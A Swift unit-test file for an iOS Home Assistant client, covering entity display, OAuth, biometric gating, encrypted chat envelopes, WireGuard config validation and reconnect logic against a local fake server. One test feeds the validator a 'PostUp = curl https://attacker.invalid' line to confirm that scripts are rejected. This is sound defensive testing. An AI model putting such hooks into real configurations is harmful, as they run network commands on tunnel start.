import XCTest
import CryptoKit
@testable import IOSNext

final class IOSNextTests: XCTestCase {
    func testProfileHasStableIdentity() {
        XCTAssertEqual(HomeProfile.timo.id, "timo")
    }

    func testEntityOnState() {
        let entity = HomeAssistantEntity(entityID: "light.example", state: "on", attributes: [:])
        XCTAssertTrue(entity.isOn)
    }

    func testEntityPresentationValues() {
        let entity = HomeAssistantEntity(
            entityID: "light.example",
            state: "unavailable",
            attributes: [
                "friendly_name": .string("Testlicht"),
                "brightness": .number(127.5)
            ]
        )
        XCTAssertEqual(entity.domain, "light")
        XCTAssertEqual(entity.displayName, "Testlicht")
        XCTAssertEqual(entity.stateDisplayName, "Nicht verfügbar")
        XCTAssertFalse(entity.isAvailable)
        XCTAssertEqual(try XCTUnwrap(entity.brightness), 0.5, accuracy: 0.0001)
    }

    func testMediaAttributesAreNormalized() {
        let entity = HomeAssistantEntity(
            entityID: "media_player.example",
            state: "playing",
            attributes: [
                "media_title": .string("Titel"),
                "volume_level": .number(1.4)
            ]
        )
        XCTAssertEqual(entity.mediaTitle, "Titel")
        XCTAssertEqual(entity.volumeLevel, 1)
        XCTAssertTrue(entity.isOn)
    }

    func testRunnerCriticalActionsRequireAuthentication() {
        XCTAssertTrue(RunnerAction.gracefulRestart.requiresBiometrics)
        XCTAssertTrue(RunnerAction.shutdown.requiresBiometrics)
        XCTAssertFalse(RunnerAction.healthCheck.requiresBiometrics)
    }

    func testAdminMutationsRequireFreshBiometrics() {
        XCTAssertFalse(AdminAction.healthCheck.requiresFreshBiometrics)
        XCTAssertTrue(AdminAction.enableMaintenance.requiresFreshBiometrics)
        XCTAssertTrue(AdminAction.clearCache.requiresFreshBiometrics)
        XCTAssertTrue(AdminAction.createBackup.requiresFreshBiometrics)
    }

    func testTimoProfileContainsOnlyVerifiedFavorites() {
        let definition = ProfileCatalog.definition(for: .timo)
        XCTAssertEqual(definition.favoriteEntityIDs, [
            "light.hintergrund_fernseher",
            "light.nachttisch",
            "light.schlafzimmer",
            "media_player.schlafzimmer"
        ])
    }

    func testOAuthAuthorizationURLUsesNativeRedirect() {
        let configuration = HomeAssistantOAuthConfiguration(
            instanceURL: URL(string: "https://ha.example.com")!,
            clientID: URL(string: "https://example.com/ios-next")!
        )
        let url = try! XCTUnwrap(configuration.authorizationURL)
        let items = URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems
        XCTAssertEqual(url.path, "/auth/authorize")
        XCTAssertEqual(items?.first(where: { $0.name == "redirect_uri" })?.value, "iosnext://auth")
    }

    func testProductionOAuthClientIDUsesPublishedPage() {
        XCTAssertEqual(
            HomeAssistantOAuthConfiguration.productionClientID.absoluteString,
            "https://nicofroeba16-cell.github.io/ha-ios-next-ios/"
        )
    }

    func testChatEnvelopeEncryptsSignsAndDecrypts() throws {
        let senderKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let recipientKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let sender = senderKeys.publicIdentity(userID: "nico", deviceID: "iphone")
        let recipient = recipientKeys.publicIdentity(userID: "mika", deviceID: "ipad")
        let plaintext = Data("Nur im RAM".utf8)
        let envelope = try senderKeys.encrypt(
            plaintext,
            kind: .text,
            contentType: "text/plain",
            groupID: "group-test",
            chunkIndex: 0,
            chunkCount: 1,
            sender: sender,
            recipient: recipient,
            createdAt: "2026-09-16T05:00:00Z"
        )
        let ciphertext = try XCTUnwrap(Data(base64Encoded: envelope.ciphertext))
        XCTAssertNotEqual(ciphertext, plaintext)
        XCTAssertEqual(try recipientKeys.decrypt(envelope, sender: sender), plaintext)
    }

    func testChatEnvelopeRejectsCiphertextTampering() throws {
        let senderKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let recipientKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let sender = senderKeys.publicIdentity(userID: "nico", deviceID: "iphone")
        let recipient = recipientKeys.publicIdentity(userID: "mika", deviceID: "ipad")
        let envelope = try senderKeys.encrypt(
            Data("Original".utf8),
            kind: .text,
            contentType: "text/plain",
            groupID: "tamper-test",
            chunkIndex: 0,
            chunkCount: 1,
            sender: sender,
            recipient: recipient,
            createdAt: "2026-09-16T05:00:00Z"
        )
        let tampered = ChatEnvelope(
            id: envelope.id,
            groupID: envelope.groupID,
            senderUserID: envelope.senderUserID,
            senderDeviceID: envelope.senderDeviceID,
            recipientUserID: envelope.recipientUserID,
            recipientDeviceID: envelope.recipientDeviceID,
            ephemeralPublicKey: envelope.ephemeralPublicKey,
            ciphertext: Data("Manipuliert".utf8).base64EncodedString(),
            signature: envelope.signature,
            messageType: envelope.messageType,
            contentType: envelope.contentType,
            chunkIndex: envelope.chunkIndex,
            chunkCount: envelope.chunkCount,
            createdAt: envelope.createdAt
        )
        XCTAssertThrowsError(try recipientKeys.decrypt(tampered, sender: sender)) { error in
            XCTAssertEqual(error as? ChatError, .invalidSignature)
        }
    }

    func testWireGuardConfigurationAcceptsStrictSubset() throws {
        let key = Data(repeating: 7, count: 32).base64EncodedString()
        let configuration = """
        [Interface]
        PrivateKey = \(key)
        Address = 10.44.0.2/32, fd44::2/128
        DNS = 10.44.0.1
        MTU = 1280

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8, fd44::/64
        Endpoint = vpn.example.com:51820
        PersistentKeepalive = 25
        """
        let parsed = try WireGuardConfigurationValidator.validate(configuration)
        XCTAssertEqual(parsed.interface.addresses, ["10.44.0.2/32", "fd44::2/128"])
        XCTAssertEqual(parsed.peers.first?.endpoint, "vpn.example.com:51820")
    }

    func testWireGuardConfigurationRejectsScripts() {
        let key = Data(repeating: 8, count: 32).base64EncodedString()
        let configuration = """
        [Interface]
        PrivateKey = \(key)
        Address = 10.44.0.2/32
        PostUp = curl https://attacker.invalid

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8
        Endpoint = vpn.example.com:51820
        """
        XCTAssertThrowsError(try WireGuardConfigurationValidator.validate(configuration))
    }

    func testWireGuardConfigurationRejectsInvalidAddressAndDuplicatePeer() {
        let key = Data(repeating: 9, count: 32).base64EncodedString()
        let invalidAddress = """
        [Interface]
        PrivateKey = \(key)
        Address = 999.1.1.1/32

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8
        Endpoint = vpn.example.com:51820
        """
        XCTAssertThrowsError(try WireGuardConfigurationValidator.validate(invalidAddress))

        let duplicatePeer = """
        [Interface]
        PrivateKey = \(key)
        Address = 10.44.0.2/32

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8
        Endpoint = vpn-a.example.com:51820

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 192.168.0.0/16
        Endpoint = vpn-b.example.com:51820
        """
        XCTAssertThrowsError(try WireGuardConfigurationValidator.validate(duplicatePeer))
    }
    func testLiveHACardCatalogCoversEveryLiveDashboardType() {
        XCTAssertEqual(
            Set(LiveHACardType.allCases.map(\.rawValue)),
            Set([
                "sections",
                "grid",
                "conditional",
                "template",
                "entity",
                "custom:mushroom-title-card",
                "custom:mushroom-chips-card",
                "custom:mushroom-template-card",
                "custom:navbar-card",
                "custom:battery-state-card",
                "custom:ios-light-card",
                "custom:ios-media-player"
            ])
        )
        XCTAssertEqual(LiveHACardType.allCases.count, 12)
    }

    func testLiveHACardScreenshotPageArguments() {
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app"]), 0)
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app", "--live-card-page=1"]), 1)
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app", "--live-card-page=2"]), 2)
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app", "--live-card-page=99"]), 0)
    }

    func testHomeAssistantCommandTimeoutBudgets() {
        XCTAssertEqual(HomeAssistantClient.commandTimeoutSeconds(for: "get_states"), 15)
        XCTAssertEqual(HomeAssistantClient.commandTimeoutSeconds(for: "subscribe_events"), 10)
        XCTAssertEqual(HomeAssistantClient.commandTimeoutSeconds(for: "call_service"), 10)
    }

    func testReconnectBackoffIncludesBoundedJitter() {
        XCTAssertEqual(AppModel.reconnectDelaySeconds(attempt: 1, jitterFraction: 0), 1, accuracy: 0.001)
        XCTAssertEqual(AppModel.reconnectDelaySeconds(attempt: 5, jitterFraction: 0), 16, accuracy: 0.001)
        XCTAssertEqual(AppModel.reconnectDelaySeconds(attempt: 9, jitterFraction: 0), 30, accuracy: 0.001)
        XCTAssertEqual(AppModel.reconnectDelaySeconds(attempt: 3, jitterFraction: -1), 3.2, accuracy: 0.001)
        XCTAssertEqual(AppModel.reconnectDelaySeconds(attempt: 3, jitterFraction: 1), 4.8, accuracy: 0.001)
    }

    func testProductAcceptanceScreenArguments() {
        XCTAssertEqual(ProductAcceptanceRootView.screen(from: ["app", "--product-ui-test-screen=home"]), .home)
        XCTAssertEqual(ProductAcceptanceRootView.screen(from: ["app", "--product-ui-test-screen=media-detail"]), .mediaDetail)
        XCTAssertEqual(ProductAcceptanceRootView.screen(from: ["app", "--product-ui-test-screen=invalid"]), .home)
    }

    func testFireTVCompanionPreviewContract() throws {
        let entity = try XCTUnwrap(
            AppModel.preview.entities.first { $0.entityID == "media_player.fire_tv_companion" }
        )
        XCTAssertEqual(entity.domain, "media_player")
        XCTAssertEqual(entity.state, "playing")
        XCTAssertEqual(entity.mediaTitle, "Companion Testfilm")
        XCTAssertEqual(entity.mediaContentType, "video")
        XCTAssertEqual(entity.volumeLevel, 0.52, accuracy: 0.001)
        XCTAssertEqual(entity.attributes["skip_interval_seconds"]?.numberValue, 10)
    }

    private func fakeHAConfiguration(_ mode: String) -> HomeAssistantConfiguration {
        HomeAssistantConfiguration(
            baseURL: URL(string: "http://127.0.0.1:18765?mode=\(mode)")!,
            accessToken: "integration-test-token"
        )
    }

    func testFakeHAWebSocketConnectAndServiceCall() async throws {
        let client = HomeAssistantClient(timing: .integrationTest)
        let states = try await client.connect(configuration: fakeHAConfiguration("normal"))
        XCTAssertEqual(
            Set(states.map(\.entityID)),
            Set(["light.fake", "media_player.fire_tv_companion"])
        )

        let fireTV = try XCTUnwrap(
            states.first { $0.entityID == "media_player.fire_tv_companion" }
        )
        XCTAssertEqual(fireTV.mediaContentType, "video")
        XCTAssertEqual(fireTV.attributes["skip_interval_seconds"]?.numberValue, 10)

        try await client.callService(
            domain: "light",
            service: "turn_on",
            targetEntityID: "light.fake"
        )
        await client.disconnect()
    }

    func testFakeHAFireTVCompanionPauseProducesStateEvent() async throws {
        let client = HomeAssistantClient(timing: .integrationTest)
        _ = try await client.connect(configuration: fakeHAConfiguration("normal"))
        let stream = await client.stateChanges()
        let paused = expectation(description: "Fire TV Companion publishes paused state")

        let observer = Task {
            for await change in stream {
                if change.entityID == "media_player.fire_tv_companion",
                   change.newState?.state == "paused" {
                    paused.fulfill()
                    break
                }
            }
        }

        try await client.callService(
            domain: "media_player",
            service: "media_pause",
            targetEntityID: "media_player.fire_tv_companion"
        )

        await fulfillment(of: [paused], timeout: 2.0)
        observer.cancel()
        await client.disconnect()
    }

    func testFakeHAAuthHandshakeTimeout() async {
        let client = HomeAssistantClient(timing: .integrationTest)

        do {
            _ = try await client.connect(configuration: fakeHAConfiguration("auth_stall"))
            XCTFail("Auth handshake should have timed out.")
        } catch HomeAssistantClientError.timedOut {
            // Expected.
        } catch {
            XCTFail("Unexpected auth timeout error: \(error)")
        }

        await client.disconnect()
    }

    func testFakeHACommandTimeout() async throws {
        let client = HomeAssistantClient(timing: .integrationTest)
        _ = try await client.connect(configuration: fakeHAConfiguration("call_stall"))

        do {
            try await client.callService(
                domain: "light",
                service: "turn_off",
                targetEntityID: "light.fake"
            )
            XCTFail("Stalled service call should have timed out.")
        } catch HomeAssistantClientError.timedOut {
            // Expected.
        } catch {
            XCTFail("Unexpected command timeout error: \(error)")
        }

        await client.disconnect()
    }

    func testFakeHAHalfOpenConnectionIsDetectedByHeartbeat() async throws {
        let client = HomeAssistantClient(timing: .integrationTest)
        _ = try await client.connect(configuration: fakeHAConfiguration("no_pong"))
        let stream = await client.stateChanges()
        let finished = expectation(description: "state stream finishes after missing pong")

        let observer = Task {
            for await _ in stream {}
            finished.fulfill()
        }

        await fulfillment(of: [finished], timeout: 2.0)
        observer.cancel()
        await client.disconnect()
    }

    func testFakeHAServerDisconnectFinishesStateStream() async throws {
        let client = HomeAssistantClient(timing: .integrationTest)
        _ = try await client.connect(configuration: fakeHAConfiguration("close_after_subscribe"))
        let stream = await client.stateChanges()
        let finished = expectation(description: "state stream finishes after server disconnect")

        let observer = Task {
            for await _ in stream {}
            finished.fulfill()
        }

        await fulfillment(of: [finished], timeout: 2.0)
        observer.cancel()
        await client.disconnect()
    }

    @MainActor
    func testAppModelReconnectsAfterFakeHAServerDrop() async throws {
        let model = AppModel()
        await model.connect(
            serverURL: URL(string: "http://127.0.0.1:18765?mode=close_once")!,
            accessToken: "integration-test-token",
            persist: false
        )
        XCTAssertTrue(model.isConnected)
        XCTAssertNotNil(
            model.entities.first { $0.entityID == "media_player.fire_tv_companion" }
        )

        var sawReconnectState = false
        var restored = false

        for _ in 0..<120 {
            try await Task.sleep(for: .milliseconds(50))

            if case .connecting = model.connectionState {
                sawReconnectState = true
            }

            if sawReconnectState,
               model.isConnected,
               model.entities.contains(where: { $0.entityID == "media_player.fire_tv_companion" }) {
                restored = true
                break
            }
        }

        XCTAssertTrue(
            sawReconnectState,
            "Expected a reconnecting state after the fake server dropped the socket."
        )
        XCTAssertTrue(
            restored,
            "Expected AppModel to reconnect and restore the Fire TV Companion entity."
        )
        model.disconnect()
    }


}
